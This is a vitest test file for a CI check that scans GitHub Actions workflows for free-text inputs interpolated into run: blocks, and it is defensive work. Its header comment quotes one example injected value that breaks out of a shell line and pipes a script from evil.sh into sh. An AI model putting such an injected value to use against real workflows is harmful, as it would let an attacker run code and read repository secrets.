/**
 * Shell-injection guard for GitHub Actions workflows (#5032).
 *
 * `${{ inputs.x }}` inside a `run:` block is expanded by the Actions expression
 * engine BEFORE the shell parses the line, so the value lands as literal script
 * text. A dispatch input containing `"; curl evil.sh | sh; #` therefore executes
 * on a runner that carries `FIREBASE_SERVICE_ACCOUNT_JSON` (a service account
 * with `resourcemanager.projectIamAdmin` — owner-equivalent on the production
 * project), `CLAUDE_CODE_OAUTH_TOKEN`, `ARTICLES_REPO_PAT`, the shard deploy
 * keys and the App private key. Not remotely exploitable (every affected
 * workflow is `workflow_dispatch`, none is reachable from a fork event), but it
 * collapses "can trigger a job" into "can read every secret in the repo".
 *
 * `origin/main` carried 53 such call sites across 30 workflow files. This test
 * keeps the count at zero: a new one fails CI instead of shipping.
 */
import { describe, expect, it } from 'vitest';
import path from 'node:path';
// @ts-expect-error — plain .mjs CI script, no type declarations
import { scanWorkflows } from '../scripts/ci/check-workflow-input-injection.mjs';

const WORKFLOWS_DIR = path.resolve(__dirname, '..', '.github', 'workflows');
const FIXTURES_DIR = path.resolve(__dirname, 'fixtures', 'workflow-input-injection');

interface Violation {
  file: string;
  job: string;
  step: string;
  expr: string;
  reason: string;
}

describe('workflow inputs never reach a run: block as script text (#5032)', () => {
  it('no workflow interpolates a free-text input into run:', () => {
    const violations: Violation[] = scanWorkflows(WORKFLOWS_DIR);
    const report = violations
      .map((v) => `  ${v.file} › ${v.job} › ${v.step}\n    ${v.expr}\n    ${v.reason}`)
      .join('\n');
    expect(
      violations.length,
      'Pass the value through the step\'s `env:` and reference the QUOTED shell ' +
        'variable ("$MY_VAR") instead — `${{ … }}` is substituted as script text, ' +
        `not as an argument.\n${report}`,
    ).toBe(0);
  });

  it('actually scanned the workflow fleet (a silent empty read would pass vacuously)', () => {
    const fs = require('node:fs') as typeof import('node:fs');
    const files = fs.readdirSync(WORKFLOWS_DIR).filter((f) => /\.ya?ml$/.test(f));
    expect(files.length).toBeGreaterThan(100);
  });

  it('flags a free-text (string) input interpolated into run:', () => {
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'unsafe-string'));
    expect(violations).toHaveLength(1);
    expect(violations[0].expr).toBe('${{ inputs.target }}');
    expect(violations[0].reason).toMatch(/type "string"/);
  });

  it('flags an input read that has no resolvable declaration', () => {
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'undeclared'));
    expect(violations).toHaveLength(1);
    expect(violations[0].reason).toMatch(/no resolvable declaration/);
  });

  it('accepts the env-indirection fix, and boolean/choice inputs inline', () => {
    expect(scanWorkflows(path.join(FIXTURES_DIR, 'safe'))).toEqual([]);
  });

  it('takes the LEAST constrained declaration when dispatch and call disagree', () => {
    // `choice` is dispatch-only, so a workflow offering the same knob to callers
    // re-declares it as `string`. The value can arrive through either path, so
    // the gate must reason about the weakest guarantee, not the last one parsed.
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'dual-declared'));
    expect(violations).toHaveLength(1);
    expect(violations[0].reason).toMatch(/type "string"/);
  });

  it('fails CLOSED on an expression it cannot terminate', () => {
    // A scanner that silently skips what it cannot parse is the one failure
    // mode a security gate must not have.
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'unterminated'));
    expect(violations).toHaveLength(1);
    expect(violations[0].reason).toMatch(/unterminated/);
  });

  it('fails CLOSED when an input is named outside any parsed expression', () => {
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'ref-outside-expression'));
    expect(violations).toHaveLength(1);
    expect(violations[0].reason).toMatch(/outside any parsed/);
  });

  it('rejects a choice option shaped like a FLAG rather than a value', () => {
    // Not a shell metacharacter, but `--force` interpolated as a bare word
    // becomes a flag for the downstream script — constrained-but-flag-shaped is
    // not the property this exemption promises.
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'flag-shaped-choice'));
    expect(violations).toHaveLength(1);
    expect(violations[0].expr).toBe('--force');
  });

  it('rejects a choice whose declared options are NOT shell-safe', () => {
    // The whole reason `choice` may stay inline is that Actions rejects any
    // value outside `options`. An option carrying a metacharacter voids that,
    // so the premise is enforced rather than assumed.
    const violations: Violation[] = scanWorkflows(path.join(FIXTURES_DIR, 'unsafe-choice-options'));
    expect(violations).toHaveLength(1);
    expect(violations[0].reason).toMatch(/shell-safe set/);
  });
});
